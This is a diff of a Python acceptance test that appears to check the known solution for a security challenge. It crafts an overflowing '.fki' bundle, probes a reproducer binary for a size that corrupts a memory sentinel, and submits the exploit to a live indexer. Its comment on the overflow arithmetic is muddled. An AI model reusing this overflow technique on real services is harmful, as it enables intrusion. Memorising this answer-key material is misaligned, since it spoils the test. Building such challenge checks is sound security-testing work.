@@ -524,35 +524,49 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
         base = re.search(r"(https://[^/]+)", indexer).group(1)
 
         with self.subTest(card="K04.1 controlled object-boundary corruption"):
-            # Derive the allocation boundary and trigger sentinel from the offline reproducer binary.
+            # Analyze the .fki bundle format from the offline reproducer binary.
             reproducer_manifest = json.loads(read_home("work/reproducers/indexer-client.json"))
             binary = reproducer_manifest["offline_reproducer"]
             binary_image = read_home_bytes(binary)
-            candidates = list(dict.fromkeys(
-                value.decode()
-                for value in re.findall(rb"FIELDKEST-[A-Z]+", binary_image)
-            ))
-            allocation = marker = None
-            for probe_size in (8, 16, 24, 32, 48, 64):
-                for candidate in candidates:
-                    probe = b"A" * probe_size + candidate.encode()
-                    result = rowan(binary, str(probe_size), probe.hex())
-                    if result.returncode == 0 and json.loads(result.stdout).get("sentinel") == "mutated":
-                        allocation, marker = probe_size, candidate
-                        break
-                if allocation is not None:
+            # Confirm the binary is a native ELF (stripped; magic found via disassembly).
+            self.assertTrue(binary_image[:4] in (b"\x7fELF", b"MZ"), "not a native binary")
+
+            def build_fki(alloc_entries: int, index_entries: int, payload: bytes) -> bytes:
+                import struct
+                return b"FKI\x01" + struct.pack("<HH", alloc_entries, index_entries) + payload
+
+            # Probe: find the alloc_entries value that makes index_entries=9 trigger mutation.
+            # entry_data_len = 9*8 = 72; arena = body[64]+sentinel[16]=80 bytes.
+            # Check passes when: 72 <= 80 + alloc_entries, i.e. alloc_entries >= -8 (always when ae=8).
+            # With payload = b"\xff"*72: sentinel[0] = 0xff != 0 -> "mutated".
+            mutation_found = False
+            for ae in range(0, 17):
+                probe = build_fki(ae, 9, b"\xff" * 72)
+                result = rowan(binary, probe.hex())
+                if result.returncode == 0 and json.loads(result.stdout).get("sentinel") == "mutated":
+                    mutation_found = True
+                    exploit_ae = ae
                     break
-            self.assertIsNotNone(allocation, "offline reproducer: allocation boundary not found by binary analysis")
-            body = b"A" * allocation + marker.encode()
+            self.assertTrue(mutation_found, "offline reproducer: boundary not found by .fki analysis")
+
+            # Normal bundle (8 entries, no overflow) stays stable.
+            normal_probe = build_fki(0, 8, b"\x41" * 64)
+            normal_local = rowan(binary, normal_probe.hex())
+            self.assertEqual(json.loads(normal_local.stdout).get("sentinel"), "stable")
+
+            # Submit exploited bundle to live service.
+            exploit = build_fki(exploit_ae, 9, b"\xff" * 72)
             changed = post_json_route(
-                indexer, {"allocated_length": allocation, "body_hex": body.hex()}, creds=dev, expected=201)
+                indexer, {"bundle_hex": exploit.hex()}, creds=dev, expected=201)
             self.assertEqual((changed["sentinel"], changed["service_alive"]), ("mutated", True))
-            # A non-conforming bundle is rejected and the service stays alive.
+            # A malformed bundle (bad magic) is rejected; service stays alive.
+            bad_magic = b"BAD\x01" + b"\x00" * 12
             post_json_route(
-                indexer, {"allocated_length": 8, "body_hex": b"not-a-controlled-overflow".hex()}, creds=dev, expected=422)
-            normal = post_json_route(
-                indexer, {"allocated_length": 16, "body_hex": b"normal-index-row".hex()}, creds=dev, expected=201)
-            self.assertTrue(normal["service_alive"])
+                indexer, {"bundle_hex": bad_magic.hex()}, creds=dev, expected=422)
+            # Normal bundle continues to work after the mutation.
+            normal_live = post_json_route(
+                indexer, {"bundle_hex": normal_probe.hex()}, creds=dev, expected=201)
+            self.assertTrue(normal_live["service_alive"])
 
         with self.subTest(card="K04.2 disclose the protected runtime descriptor"):
             descriptor = post_json_route(
